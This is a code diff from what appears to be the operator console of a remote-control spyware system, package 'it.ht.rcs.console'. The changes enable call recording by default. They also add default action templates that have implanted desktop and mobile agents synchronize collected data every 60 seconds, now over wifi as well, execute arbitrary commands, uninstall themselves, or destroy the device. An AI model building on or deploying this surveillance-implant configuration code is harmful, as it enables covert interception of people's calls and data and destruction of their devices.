@@ -16,14 +16,7 @@ package it.ht.rcs.console
       var config:Object = {};
       config.modules = getModules();
       config.events  = [{ desc: "SYNC", event: "timer", subtype: "loop", repeat: 0, delay: 60, ts: "00:00:00", te: "23:59:59", enabled: true }];
-      config.actions = [{ desc: "SYNC", subactions: [{ action: "synchronize",
-                                                       host: "",
-                                                       bandwidth: 500000,
-                                                       mindelay: 0,
-                                                       maxdelay: 0,
-                                                       stop: false,
-                                                       wifi: false,
-                                                       cell: false }] }];
+      config.actions = [{ desc: "SYNC", subactions: [ getDefaultAction('synchronize') ] }];
       config.globals = getGlobals();
       
       return config;
@@ -53,6 +46,7 @@ package it.ht.rcs.console
         
         {
           module: "call",
+          record: true,
           buffer: 524288,
           compression: 5,
           _type: "desktop,mobile",
@@ -214,7 +208,6 @@ package it.ht.rcs.console
     private static function moduleFilterFunction(item:Object):Boolean
     {
       return item._type.indexOf(agent.type) != -1;
-      //return true;
     }
     
     private static function getGlobals():Object
@@ -233,6 +226,42 @@ package it.ht.rcs.console
       
       return globals;
       
+    }
+    
+    public static function getDefaultAction(name:String):Object
+    {
+      var action:String = name.toLowerCase();
+      var a:Object;
+      
+      switch (action) {
+        case 'synchronize':
+          a = { action: "synchronize",
+                host: "",
+                bandwidth: 500000,
+                mindelay: 0,
+                maxdelay: 0,
+                stop: false,
+                wifi: true,
+                cell: false };
+          return a;
+        case 'log':
+          a = { action: "log",
+                text: "" };
+          return a;
+        case 'execute':
+          a = { action: "execute",
+                command: "" };
+          return a;
+        case 'uninstall':
+          a = { action: "uninstall" };
+          return a;
+        case 'destroy':
+          a = { action: "destroy",
+                permanent: false };
+          return a;
+        default:
+          return null;
+      }
     }
     
   }
